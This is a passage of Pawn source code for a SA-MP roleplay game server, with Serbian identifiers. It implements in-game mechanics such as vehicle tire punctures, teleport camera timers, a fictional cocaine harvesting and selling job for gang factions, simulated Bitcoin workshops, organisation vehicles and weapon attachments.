                        PucanjeGumeBrojac[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                case 3: {

                    if(PucanjeGumeBrojac[playerid] >= 450) {

                        new sansa = random(4);
                        if(sansa == 1) { //Puca guma

                            new panels, doors, lights, gume;
                            GetVehicleDamageStatus(id, panels, doors, lights, gume);
                            if(gume != 0) return 1;
                            PucanjeGumeBrojac[playerid] = 0;
                            UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
                            SetVehicleHealth(id, 900);
                            SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
                            return 1;
                        }
                        PucanjeGumeBrojac[playerid] = 0;
                        return 1;
                    }
                    return 1;
                }
                case 4: {

                    // if(PucanjeGumeBrojac[playerid] >= 500) {

                    //     new sansa = random(5);
                    //     if(sansa == 1) { //Puca guma

                    //         new panels, doors, lights, gume;
                    //         GetVehicleDamageStatus(id, panels, doors, lights, gume);
                    //         if(gume != 0) return 1;
                    //         PucanjeGumeBrojac[playerid] = 0;
                    //         UpdateVehicleDamageStatus(id, panels, doors, lights, 1);
                    //         SendInfoMessage(playerid, "Pukla ti je guma! Koristi /popravivozilo");
                    //         return 1;
                    //     }
                    //     PucanjeGumeBrojac[playerid] = 0;
                    //     return 1;
                    // }
                    return 1;
                }
            }
        }
    }
    return 1;
}

forward PortajIgraca(playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ);
public PortajIgraca(playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ) {

    //defer UcitavanjeTimer(playerid);
    if(portSeIgrac[playerid]) return 0;
    portSeIgrac[playerid] = true;
    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
    TogglePlayerControllable( playerid, false);
    Novi_SetPlayerPos(playerid, PozicijaX, PozicijaY, PozicijaZ);
    defer Port1Timer(playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ);
    return 1;
}

timer Port1Timer[100](playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ) {

    SetPlayerCameraPos(playerid, PozicijaX, PozicijaY, PozicijaZ+80.0);
    SetPlayerCameraLookAt(playerid, PozicijaX, PozicijaY, PozicijaZ, CAMERA_CUT);
    defer Port2Timer(playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ);
    return 1;
}

timer Port2Timer[2000](playerid, Float:PozicijaX, Float:PozicijaY, Float:PozicijaZ) {

    SetPlayerCameraPos(playerid, PozicijaX, PozicijaY, PozicijaZ+20.0);
    SetPlayerCameraLookAt(playerid, PozicijaX, PozicijaY, PozicijaZ, CAMERA_CUT);
    defer Port3Timer(playerid);
    return 1;
}

timer Port3Timer[2000](playerid) {

    SetCameraBehindPlayer(playerid);
    TogglePlayerControllable( playerid, true);
    portSeIgrac[playerid] = false;
    return 1;
}

CMD:preradikokain(playerid, params[]) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 2152.8135,-2270.9937,13.3090)) return SendErrorMessage(playerid, "Nisi na mestu!");

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA)
        return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");

    if(PlayerInfo[playerid][xKokainPrerada] > 0) return SendErrorMessage(playerid, "Vec imas kokain na preradi!");
    if(TrenutniKokain[playerid] < 50) return SendErrorMessage(playerid, "Potrebno je minimalno 50g za preradu!");

    new kolicina;
    if(sscanf(params, "d", kolicina)) return SendUsageMessage(playerid, "/preradikokain [KOLICINA]");
    if(kolicina < 50 || kolicina > 100) return SendErrorMessage(playerid, "Kolicina ne moze biti manja od 50 ili veca od 100!");

    new vreme;
    if(kolicina >= 55) vreme = 30;
    else if(kolicina >= 70) vreme = 40;
    else if(kolicina >= 80) vreme = 60; 

    PlayerInfo[playerid][xKokainPrerada] = kolicina;
    PlayerInfo[playerid][xKokainPreradaVreme] = vreme;

    TrenutniKokain[playerid] -= kolicina;

    SavePlayer(playerid);

    SendInfoMessage(playerid, "Ostavio si %dg kokaina na preradi! Prerada ce biti gotova za %d minuta!", kolicina, vreme);

    return 1;
}

CMD:preradjenikokain(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 2143.9131,-2265.1423,13.2955)) return SendErrorMessage(playerid, "Nisi na mestu!");
    if(PlayerInfo[playerid][xKokainPrerada] == 0) return SendErrorMessage(playerid, "Nemas kokain na preradi!");
    if(PlayerInfo[playerid][xKokainPreradaVreme] > 0) return SendErrorMessage(playerid, "Prerada nije gotova! Preostalo : %d minuta!", PlayerInfo[playerid][xKokainPreradaVreme]);

    new koks = PlayerInfo[playerid][xKokainPrerada] / 2;

    PlayerInfo[playerid][xKokainPreradjeni] += koks;
    PlayerInfo[playerid][xKokainPrerada] = 0;
    PlayerInfo[playerid][xKokainPreradaVreme] = 0;

    SavePlayer(playerid);

    SendInfoMessage(playerid, "Uspesno si zavrsio preradu i dobio %d kokaina! Sada imas : %d grama!", koks, PlayerInfo[playerid][xKokainPreradjeni]);

    return 1;
}

//Ovde treba 60000
ptask KokainPreradaTimer[60000](playerid) {

    if(IsPlayerNPC(playerid)) return 0;

    if(PlayerInfo[playerid][xKokainPreradaVreme] == 0) return 0;

    PlayerInfo[playerid][xKokainPreradaVreme]--;

    if(PlayerInfo[playerid][xKokainPreradaVreme] == 0) {

        SendInfoMessage(playerid, "Prerada kokaina je zavrsena!");
    }

    SavePlayer(playerid);

    return 1;
}

// CMD:setkokain(playerid, params[]) {

//     new kolicina;
//     if(sscanf(params, "d", kolicina)) return SendUsageMessage(playerid, "/setkokain [KOLICINA]");

//     TrenutniKokain[playerid] = kolicina;

//     SendInfoMessage(playerid, "Postavio si Ubrani kokain na %d !", kolicina);

//     return 1;
// }

CMD:uberikoks(playerid) {

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA)
        return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");

    new plant_id = -1;

    for(new i = 0; i < 20; i++) {

        if(IsPlayerInRangeOfPoint(playerid, 2.0, BiljkePozicije[PlantNumber[i]][0], BiljkePozicije[PlantNumber[i]][1], BiljkePozicije[PlantNumber[i]][2])) {

            plant_id = i;
            break;
        }
    }

    if(plant_id == -1) return SendErrorMessage(playerid, "Nisi blizu nijednog polja kokaina!");

    if(!KokainTorba[playerid]) return SendErrorMessage(playerid, "Nemas torbu za kokain! Kupi je na Black Marketu!");

    if(IsValidDynamicObject(PlantObj[plant_id]))
        DestroyDynamicObject(PlantObj[plant_id]);
    if(IsValidDynamic3DTextLabel(PlantLabel[plant_id]))
        DestroyDynamic3DTextLabel(PlantLabel[plant_id]);

    new plant_number = random(sizeof(BiljkePozicije));

    PlantNumber[plant_id] = plant_number;
    PlantObj[plant_id] = CreateDynamicObject(759, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2]-1.0, 0, 0, 0, -1, -1, -1, 350.00, 350.00, -1, 0);
    PlantLabel[plant_id] = CreateDynamic3DTextLabel(""col_white"Da uberete kokain za Favelle kucajte\n"SRVBOJA1SCM"[ /uberikoks ]", -1, BiljkePozicije[plant_number][0], BiljkePozicije[plant_number][1], BiljkePozicije[plant_number][2], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

    TogglePlayerControllable(playerid, 0);
    ApplyAnimation( playerid, "BOMBER", "Plant_Loop", 4.0, 0, 0, 0, 7000, 0 );

    GameTextForPlayer(playerid, "Pricekaj! Beres...", 7000, 4);

    defer BereKokain(playerid);

    return 1;
}

timer BereKokain[7000](playerid) {

    TogglePlayerControllable(playerid, true);
    new koks = RandomNew(1, 5);
    TrenutniKokain[playerid] += koks;

    SendInfoMessage(playerid, "Ubrao si stabljiku i dobio %d grama! Trenutno imate %d grama!", koks, TrenutniKokain[playerid]);

    return 1;
}

WastedTDControl(playerid, bool:show) {

    if(show) {

        for(new i = 0; i < 2; i++) {

            TextDrawShowForPlayer(playerid, WastedTD[i]);
        }

        PlayAudioStreamForPlayer(playerid, "http://picosong.com/cdn/3bfbe4b02437852621d51db976d7abf8.mp3");

        wastedTDShown[playerid] = true;
        
        return 1;
    }
    else {

        for(new i = 0; i < 2; i++) {

            TextDrawHideForPlayer(playerid, WastedTD[i]);
        }

        wastedTDShown[playerid] = false;

        return 1;
    }
}

stock NextBitCoinWorkShopID(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), BITCOIN_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

GetNearestBtcWorkShop( playerid ) {

    for( new i = 0; i < MAX_BTCW; i++) {

        if( IsPlayerInRangeOfPoint( playerid, 3.0, BitcoinInfo[ i ][ bUlazX ], BitcoinInfo[ i ][ bUlazY ], BitcoinInfo[ i ][ bUlazZ ] )) { return i; }
    }
    return -1;
}

CMD:kupiworkshop( playerid, params[] ) {
    new id = GetNearestBtcWorkShop( playerid );

    if( id == -1 ) return SendErrorMessage( playerid, "U blizini nema nijedan BitCoin WorkShop." );
    if( PlayerInfo[ playerid ][ xWorkShopID ] != -1 ) return SendErrorMessage( playerid, "Vec posedujete jedan workshop." );
    if( PlayerInfo[ playerid ][ xNovac ] < BTCWORKSHOP_PRICE ) return SendErrorMessage( playerid, "Nemate dovoljno novca (%d$).", BTCWORKSHOP_PRICE);
    if(strcmp( BitcoinInfo[id][bVlasnik], "Niko", true )) return SendErrorMessage(playerid, "Ovaj Bitcoin Workshop ima vlasnika!");

    DajIgracuNovac( playerid, -BTCWORKSHOP_PRICE );
    PlayerInfo[ playerid ][ xWorkShopID ] = id;
    SavePlayer( playerid );

    strmid( BitcoinInfo[ id ][ bVlasnik ], ImeIgraca( playerid ), 0, strlen( ImeIgraca( playerid ) ), MAX_PLAYER_NAME );

    SacuvajBTCWorkShop(id);
    BitCoinLP(id);

    SendInfoMessage( playerid, "Kupili ste BitCoin Workshop za %d$!", BTCWORKSHOP_PRICE);
    return (true);
}

task BitCoinMine[3600000]() {

    for( new id = 0; id < MAX_BTCW; id++ ) {

        new filename[ 32 ];
        format( filename, sizeof( filename ), BITCOIN_FILE, id );

        if( fexist( filename ) ) {

            if(strcmp( BitcoinInfo[id][bVlasnik], "Niko", true )) {

                if(BitcoinInfo[id][bPokvareno] == 1) continue;

                new sansa = RandomNew(1, 7);
                if(sansa == 4) {

                    BitcoinInfo[id][bPokvareno] = 1;
                    SacuvajBTCWorkShop(id);

                    continue;
                }

                new dobitak;
                if(BitcoinInfo[id][bMasine] == 1) { dobitak = 1; }
                else if(BitcoinInfo[id][bMasine] == 2) { dobitak = 2; }
                else if(BitcoinInfo[id][bMasine] == 3) { dobitak = 3; }
                else if(BitcoinInfo[id][bMasine] == 4) { dobitak = 4; }
                else if(BitcoinInfo[id][bMasine] == 5) { dobitak = 5; }
                else if(BitcoinInfo[id][bMasine] == 6) { dobitak = 6; }
                else if(BitcoinInfo[id][bMasine] == 7) { dobitak = 7; }
                else if(BitcoinInfo[id][bMasine] == 8) { dobitak = 8; }
                else if(BitcoinInfo[id][bMasine] == 9) { dobitak = 9; }
                else if(BitcoinInfo[id][bMasine] == 10) { dobitak = 10; }

                BitcoinInfo[id][bNovac] += dobitak;
                SacuvajBTCWorkShop(id);
            }
        }
    }
    return 1;
}

CMD:btcserver(playerid) {

    if(PlayerInfo[playerid][xWorkShopID] == -1) return SendErrorMessage(playerid, "Ti nemas svoj BitCoin WorkShop!");

    if(IsPlayerInRangeOfPoint(playerid, 2.0, 2294.5474,-1786.3489,1600.7520) && GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][xWorkShopID]) {

        ShowPlayerDialog(playerid, dialog_BTCServer, DIALOG_STYLE_LIST, "Podesavanje BitCoin Servera", "Status Servera\nResetovanje Servera\nPodigni Bitcoin\nProdaj Drzavi\nProdaj Igracu", D_ODABERI, D_ODUSTANI);
        return 1;
    }
    else return SendErrorMessage(playerid, "Nisi na mestu ili u svom Bitcoin WorkShop-u!");
}

CMD:btcprodaja(playerid) {

    if(PlayerInfo[playerid][xBitcoin] == 0) return SendErrorMessage(playerid, "Nemas nijedan bitcoin!");

    ShowPlayerDialog(playerid, dialog_BTCProdaja, DIALOG_STYLE_LIST, "BTC Prodaja", "Prodaj Banci\nProdaj Black Marketu", "Potvrdi", "Odustani");

    return 1;
}

stock SledeciIDOrgVeh(const len) {
    new id = (-1);
    for( new loop = ( 0 ), provjera = ( -1 ), Data_[ 64 ] = "\0"; loop != len; ++ loop ) {
       provjera = ( loop+1 );
       format( Data_, ( sizeof Data_ ), ORGVEH_FILE, provjera );
       if(!fexist(Data_)) {
          id = ( provjera );
          break; } }
    return ( id );
}

stock NajbliziIDOrgVeh(playerid) {

    for(new i; i< sizeof(OrgVehInfo); i++) {

        if(IsPlayerInRangeOfPoint(playerid, 3.0, OrgVehInfo[i][oVehPosX], OrgVehInfo[i][oVehPosY], OrgVehInfo[i][oVehPosZ])) return i;
    }
    return -1;
}

stock NajbliziMojIDOrgVeh(playerid) {

    for(new i; i< sizeof(OrgVehInfo); i++) {

        if(IsPlayerInRangeOfPoint(playerid, 3.0, OrgVehInfo[i][oVehPosX], OrgVehInfo[i][oVehPosY], OrgVehInfo[i][oVehPosZ])) {

            if(OrgVehInfo[i][oVehOrgID] == PlayerInfo[playerid][xClan]) return i;
        }
    }
    return -1;
}

CMD:orgveh(playerid) {

    if(PlayerInfo[playerid][xClan] == 0) return SendErrorMessage(playerid, "Samo clanovi organizacije!");

    if(OrgVeh[playerid] == -1) {

        for(new i; i< sizeof(OrgVehInfo); i++)
        {
            if(IsPlayerInRangeOfPoint(playerid, 3.0, OrgVehInfo[i][oVehPosX], OrgVehInfo[i][oVehPosY], OrgVehInfo[i][oVehPosZ]))
            {
                if(OrgVehInfo[i][oVehOrgID] == PlayerInfo[playerid][xClan]) {

                    new VehString[2048];
                    new string[64];

                    format(string, sizeof(string), ""SRVBOJA1SCM"1) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel1] - 400], OrgVehInfo[i][oVehKolicina1]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"2) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel2] - 400], OrgVehInfo[i][oVehKolicina2]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"3) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel3] - 400], OrgVehInfo[i][oVehKolicina3]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"4) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel4] - 400], OrgVehInfo[i][oVehKolicina4]);
                    strcat(VehString, string);
                    format(string, sizeof(string), ""SRVBOJA1SCM"5) "col_white"%s | "SRVBOJA1SCM"Kolicina : "col_white"%d\n", ImenaVozila[OrgVehInfo[i][oVehModel5] - 400], OrgVehInfo[i][oVehKolicina5]);
                    strcat(VehString, string);

                    ShowPlayerDialog(playerid, dialog_OrgVoziloUzmi, DIALOG_STYLE_LIST, "Org Vozilo", VehString, "Potvrdi", "Odustani");
                    return 1;

                }
            }
        }
        
        return SendErrorMessage(playerid, "Nisi na mestu!");
    }

    else if(OrgVeh[playerid] != -1) {

        new id = OrgVehID[playerid];
        if(OrgVehBroj[playerid] == 1) {

            OrgVehInfo[id][oVehKolicina1]++;
        }
        if(OrgVehBroj[playerid] == 2) {

            OrgVehInfo[id][oVehKolicina2]++;
        }
        if(OrgVehBroj[playerid] == 3) {

            OrgVehInfo[id][oVehKolicina3]++;
        }
        if(OrgVehBroj[playerid] == 4) {

            OrgVehInfo[id][oVehKolicina4]++;
        }
        if(OrgVehBroj[playerid] == 5) {

            OrgVehInfo[id][oVehKolicina5]++;
        }

        Novi_DestroyVehicle(OrgVeh[playerid]);
        // Delete3DTextLabel(OrgVehLabelIgrac[playerid]);
        OrgVeh[playerid] = -1;
        SendInfoMessage(playerid, "Unistio si organizacijsko vozilo!");
        SacuvajOrgVehPickup(id);
        return 1;
    }
    return 1;
}

CMD:prodajkokain(playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 2.0, 2090.9043,-972.8184,51.9200)) return SendErrorMessage(playerid, "Nisi na mestu!");

    if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA)
        return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");

    if(ProdajaFavella) return SendErrorMessage(playerid, "Neko vec prodaje kokain!");

    new hours;
    gettime(hours);
    if(hours > 21 && hours < 19) return SendErrorMessage(playerid, "Prodaju mozes izvrsiti od 19:00 do 21:00!");
    if(PlayerInfo[playerid][xKokainPreradjeni] < 300) return SendErrorMessage(playerid, "Za prodaju moras imati 300g preradjenog kokaina!");

    ProdajaFavella = true;
    ProdajeKokain[playerid] = 900;
    ProdajeKokainRange[playerid] = 0;
    UmroKoks[playerid] = false;

    FavellaTDControl(playerid, true);

    PlayerInfo[playerid][xKokainPreradjeni] -= 300;
    SavePlayer(playerid);

    SendInfoMessage(playerid, "Zapoceo si prodaju Favellama, ostani u blizini!");

    SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Neko je upravo zapoceo prodaju droge u Favellama!");

    defer ProdajeKokainTimer(playerid);
    
    return 1;
}

timer IzasaoKokainRange[1000](playerid) {

    if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2090.9043,-972.8184,51.9200)) {

        ProdajeKokainRange[playerid]--;

        if(ProdajeKokainRange[playerid] == 0) {

            ProdajeKokain[playerid] = 0;
            SendInfoMessage(playerid, "Prodaja nije uspela! Izasao si iz kruga Favelle!");

            SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Igrac koji je prodavao drogu je pobegao!");

            FavellaTDControl(playerid, false);
            ProdajaFavella = false;
            return 1;
        }

        va_GameTextForPlayer(playerid, "Napustio si Favelle : %d", 1000, 3, ProdajeKokainRange[playerid]);
        defer IzasaoKokainRange(playerid);
        return 1;
    }

    else {

        SendInfoMessage(playerid, "Vratio si se na vreme!");
        defer ProdajeKokainTimer(playerid);
    }

    return 1;
}

timer ProdajeKokainTimer[1000](playerid) {

    if(ProdajeKokain[playerid] >= 1) {

        if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2090.9043,-972.8184,51.9200)) {

            ProdajeKokainRange[playerid] = 10;
            defer IzasaoKokainRange(playerid);

            return 1;
        }

        FavellaTDUpdate(playerid);
        ProdajeKokain[playerid]--;
        defer ProdajeKokainTimer(playerid);

        return 1;
    }

    else {

        if(UmroKoks[playerid]) return 0;

        ProdajaFavella = false;
        FavellaTDControl(playerid, false);
        SendInfoMessage(playerid, "Uspesno si prodao kokain, odnesi torbu u svoju organizaciju!");

        SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Neko je uspesno prodao drogu! Zaustavi ga da bi dobio novac!");

        NosiFavella[playerid] = true;

        new OrgID = PlayerInfo[playerid][xClan];

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, OI[OrgID][oPozExtX], OI[OrgID][oPozExtY], OI[OrgID][oPozExtZ], 5.0);

        return 1;
    }
}

FavellaTDUpdate(playerid) {

    PlayerTextDrawHide(playerid, FavellaProdajaTD[playerid][4]);

    new str[16];
    format(str, sizeof(str), "%d sekundi", ProdajeKokain[playerid]);
    PlayerTextDrawSetString(playerid, FavellaProdajaTD[playerid][4], str);

    PlayerTextDrawShow(playerid, FavellaProdajaTD[playerid][4]);

    return 1;
}

FavellaTDControl(playerid, bool:show) {

    if(show) {

        FavellaProdajaTD[playerid][0] = CreatePlayerTextDraw(playerid, 5.833334, 187.407394, "box");
        PlayerTextDrawLetterSize(playerid, FavellaProdajaTD[playerid][0], 0.000000, 4.291667);
        PlayerTextDrawTextSize(playerid, FavellaProdajaTD[playerid][0], 112.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, FavellaProdajaTD[playerid][0], 1);
        PlayerTextDrawColor(playerid, FavellaProdajaTD[playerid][0], -1);
        PlayerTextDrawUseBox(playerid, FavellaProdajaTD[playerid][0], 1);
        PlayerTextDrawBoxColor(playerid, FavellaProdajaTD[playerid][0], 204);
        PlayerTextDrawSetShadow(playerid, FavellaProdajaTD[playerid][0], 0);
        PlayerTextDrawBackgroundColor(playerid, FavellaProdajaTD[playerid][0], 255);
        PlayerTextDrawFont(playerid, FavellaProdajaTD[playerid][0], 1);
        PlayerTextDrawSetProportional(playerid, FavellaProdajaTD[playerid][0], 1);

        FavellaProdajaTD[playerid][1] = CreatePlayerTextDraw(playerid, 15.416644, 186.888839, "Prodaja Favellama");
        PlayerTextDrawLetterSize(playerid, FavellaProdajaTD[playerid][1], 0.267916, 1.449630);
        PlayerTextDrawTextSize(playerid, FavellaProdajaTD[playerid][1], 171.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, FavellaProdajaTD[playerid][1], 1);
        PlayerTextDrawColor(playerid, FavellaProdajaTD[playerid][1], -16711681);
        PlayerTextDrawSetShadow(playerid, FavellaProdajaTD[playerid][1], 0);
        PlayerTextDrawBackgroundColor(playerid, FavellaProdajaTD[playerid][1], 255);
        PlayerTextDrawFont(playerid, FavellaProdajaTD[playerid][1], 1);
        PlayerTextDrawSetProportional(playerid, FavellaProdajaTD[playerid][1], 1);

        FavellaProdajaTD[playerid][2] = CreatePlayerTextDraw(playerid, 9.999974, 204.259353, "particle:lamp_shad_64");
        PlayerTextDrawTextSize(playerid, FavellaProdajaTD[playerid][2], 91.000000, 3.000000);
        PlayerTextDrawAlignment(playerid, FavellaProdajaTD[playerid][2], 1);
        PlayerTextDrawColor(playerid, FavellaProdajaTD[playerid][2], -16711681);
        PlayerTextDrawSetShadow(playerid, FavellaProdajaTD[playerid][2], 0);
        PlayerTextDrawBackgroundColor(playerid, FavellaProdajaTD[playerid][2], 255);
        PlayerTextDrawFont(playerid, FavellaProdajaTD[playerid][2], 4);
        PlayerTextDrawSetProportional(playerid, FavellaProdajaTD[playerid][2], 0);

        FavellaProdajaTD[playerid][3] = CreatePlayerTextDraw(playerid, 12.083281, 209.703475, "Preostalo :");
        PlayerTextDrawLetterSize(playerid, FavellaProdajaTD[playerid][3], 0.212083, 1.387408);
        PlayerTextDrawTextSize(playerid, FavellaProdajaTD[playerid][3], 111.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, FavellaProdajaTD[playerid][3], 1);
        PlayerTextDrawColor(playerid, FavellaProdajaTD[playerid][3], -16711681);
        PlayerTextDrawSetShadow(playerid, FavellaProdajaTD[playerid][3], 0);
        PlayerTextDrawBackgroundColor(playerid, FavellaProdajaTD[playerid][3], 255);
        PlayerTextDrawFont(playerid, FavellaProdajaTD[playerid][3], 1);
        PlayerTextDrawSetProportional(playerid, FavellaProdajaTD[playerid][3], 1);

        FavellaProdajaTD[playerid][4] = CreatePlayerTextDraw(playerid, 56.666610, 208.666458, "900 sekundi");
        PlayerTextDrawLetterSize(playerid, FavellaProdajaTD[playerid][4], 0.262916, 1.688147);
        PlayerTextDrawTextSize(playerid, FavellaProdajaTD[playerid][4], 297.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, FavellaProdajaTD[playerid][4], 1);
        PlayerTextDrawColor(playerid, FavellaProdajaTD[playerid][4], -16711681);
        PlayerTextDrawSetShadow(playerid, FavellaProdajaTD[playerid][4], 0);
        PlayerTextDrawBackgroundColor(playerid, FavellaProdajaTD[playerid][4], 255);
        PlayerTextDrawFont(playerid, FavellaProdajaTD[playerid][4], 1);
        PlayerTextDrawSetProportional(playerid, FavellaProdajaTD[playerid][4], 1);

        new str[16];
        format(str, sizeof(str), "%d sekundi", ProdajeKokain[playerid]);

        PlayerTextDrawSetString(playerid, FavellaProdajaTD[playerid][4], str);

        for(new td = 0; td < 5; td++) {

            PlayerTextDrawShow(playerid, FavellaProdajaTD[playerid][td]);
        }

    }

    else if(!show) {

        for(new td = 0; td < 5; td++) {

            PlayerTextDrawHide(playerid, FavellaProdajaTD[playerid][td]);
        }
    }
    return 1;
}

timer KreirajFavellaPickup[4000](Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ) {

    FavellaPickup = CreateDynamicPickup(1252, 1, IgracPosX, IgracPosY, IgracPosZ, -1, -1, -1, STREAMER_PICKUP_SD, -1, 0);

    FavellaPickupTimer = defer TimerZaPickupFavella();

    return 1;
}

timer TimerZaPickupFavella[30000]() {

    if(IsValidDynamicPickup(FavellaPickup))
        DestroyDynamicPickup(FavellaPickup);

    ProdajaFavella = false;

    SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Niko nije nastavio prodaju!");

    return 1;
}

timer KreirajNovacFavellaPickup[3000](Float:IgracPosX, Float:IgracPosY, Float:IgracPosZ) {

    FavellaNovacPickup = CreateDynamicPickup(1550, 1, IgracPosX, IgracPosY, IgracPosZ, -1, -1, -1, 40.0, -1, 0);

    return 1;
}

public AttachWeapon(){
    for(new i = 0; i < MAX_PLAYERS+1; i++){
        if(IsPlayerNPC(i)) return 1;
        if(IsPlayerInAnyVehicle(i)) {
            for(new a = 0; a < 9; a++) if(IsPlayerAttachedObjectSlotUsed(i, a)) RemovePlayerAttachedObject(i, a);
            wep[i] = -1;
            return 1;
        }
        if(!d[i]) return 1;
        if(camera[i]) return 1;
        
        if(wep[i] != GetPlayerWeapon(i)) for(new a = 0; a < 12; a++){
            GetPlayerWeaponData(i, a, weps[a], weps[6]);
            switch(a){
                case 0: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 0)) RemovePlayerAttachedObject(i, 0);
                    if(weps[a] == 1 && GetPlayerWeapon(i) != 1) SetPlayerAttachedObject( i, 0, 331, 6, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
                }
                case 1: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 1)) RemovePlayerAttachedObject(i, 1);
                    switch(weps[a]){
                        case 4: if(GetPlayerWeapon(i) != 4) SetPlayerAttachedObject( i, 0, 335, 11, 0.142010, -0.100988, 0.055910, 76.125000, 75.876144, 1.143326, 1.000000, 1.000000, 1.000000 );
                        case 8: if(GetPlayerWeapon(i) != 8) SetPlayerAttachedObject( i, 1, 339, 15, 0.088326, 0.066626, 0.148351, 191.990447, 341.412963, 0.000000, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 2: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 2)) RemovePlayerAttachedObject(i, 2);
                    switch(weps[a]){
                        case 22: if(GetPlayerWeapon(i) != 22) SetPlayerAttachedObject( i, 2, 346, 8, -0.028010, -0.033822, 0.097883, 270.000000, 15.999426, 354.161499, 1.000000, 1.000000, 1.000000 );
                        case 23: if(GetPlayerWeapon(i) != 23) SetPlayerAttachedObject( i, 2, 346, 8, -0.028010, -0.033822, 0.097883, 270.000000, 15.999426, 354.161499, 1.000000, 1.000000, 1.000000 );
                        case 24: if(GetPlayerWeapon(i) != 24) SetPlayerAttachedObject( i, 2, 348, 8, -0.040643, -0.048525, 0.085376, 270.000000, 8.253683, 0.000000, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 3: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 3)) RemovePlayerAttachedObject(i, 3);
                    switch(weps[a]){
                        case 25: if(GetPlayerWeapon(i) != 25) SetPlayerAttachedObject( i, 3, 349, 16, 0.084126, 0.131737, 0.197423, 176.984542, 92.569320, 14.483574, 1.000000, 1.000000, 1.000000 );
                        case 26: if(GetPlayerWeapon(i) != 26) SetPlayerAttachedObject( i, 3, 350, 16, 0.090676, 0.085271, -0.075131, 0.000000, 289.166870, 355.209869, 1.000000, 1.000000, 1.000000 );
                        case 27: if(GetPlayerWeapon(i) != 27) SetPlayerAttachedObject( i, 3, 351, 16, 0.100795, 0.057224, -0.082939, 180.000000, 243.483581, 180.000000, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 4: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 4)) RemovePlayerAttachedObject(i, 4);
                    switch(weps[a]){
                        case 28: if(GetPlayerWeapon(i) != 28) SetPlayerAttachedObject( i, 4, 352, 7, 0.138560, -0.033982, -0.047630, 281.671447, 276.618591, 4.068862, 1.000000, 1.000000, 1.000000 );
                        case 29: if(GetPlayerWeapon(i) != 29) SetPlayerAttachedObject( i, 4, 353, 7, 0.008329, -0.067031, -0.060214, 289.865051, 17.391622, 7.667663, 1.000000, 1.000000, 1.000000 );
                        case 32: if(GetPlayerWeapon(i) != 32) SetPlayerAttachedObject( i, 4, 372, 7, 0.056180, -0.008887, -0.007959, 270.000000, 13.921591, 5.905599, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 5: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 5)) RemovePlayerAttachedObject(i, 5);
                    switch(weps[a]){
                        case 30: if(GetPlayerWeapon(i) != 30) SetPlayerAttachedObject( i, 5, 355, 1, -0.130044, -0.127836, 0.025491, 2.044970, 6.239807, 6.833646, 1.000000, 1.000000, 1.000000 );
                        case 31: if(GetPlayerWeapon(i) != 31) SetPlayerAttachedObject( i, 5, 356, 16, 0.019280, 0.118553, 0.396286, 70.920410, 274.673919, 253.978057, 1.000000, 1.000000, 1.000000 );
                    }
                }
                case 8: {
                    if(IsPlayerAttachedObjectSlotUsed(i, 6)) RemovePlayerAttachedObject(i, 6);
